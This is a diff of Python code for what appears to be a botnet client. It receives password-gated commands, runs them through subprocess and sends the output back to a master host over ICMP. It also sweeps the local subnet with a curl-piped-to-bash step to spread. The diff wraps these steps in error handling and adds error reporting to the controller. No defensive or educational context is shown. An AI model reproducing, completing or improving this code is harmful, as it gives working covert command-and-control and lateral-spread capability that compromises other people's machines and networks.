@@ -44,16 +44,21 @@ class Handler(threading.Thread):
 					octets = localhost.split(".")
 					for i in range(1,253):
 						if i != octets[3]:
-							out = subprocess.check_output("curl", self.web ,octets[0]+"."+octets[1]+"."+octets[2]+"."+str(i), "|","/bin/bash")
-							send_icmp(localhost, self.master, "EXPLOIT-OUTPUT"+out)
-						
+							try:
+								out = subprocess.check_output("curl", self.web ,octets[0]+"."+octets[1]+"."+octets[2]+"."+str(i), "|","/bin/bash")
+								send_icmp(localhost, self.master, "EXPLOIT-OUTPUT"+out)
+							except subprocess.CalledProcessError as e:
+								pass	
 			else:
 				print self.passwd
 				cmd = raw[len(self.passwd):]
 				print("RECEIVED: "+cmd)
-				out = subprocess.check_output(cmd.split())
-				print("OUT: "+str(out))
-				send_icmp(localhost, self.master, "OUTPUT"+out)
+				try:
+					out = subprocess.check_output(cmd.split())
+					print("OUT: "+str(out))
+				except subprocess.CalledProcessError as e:
+					send_icmp(localhost, self.master, "ERROR:"+localhost+">>"+e.output)
+				send_icmp(localhost, self.master, "OUTPUT:"+localhost+">>"+out)
 
 def init():
 	print("Bot started...["+localhost+"]")
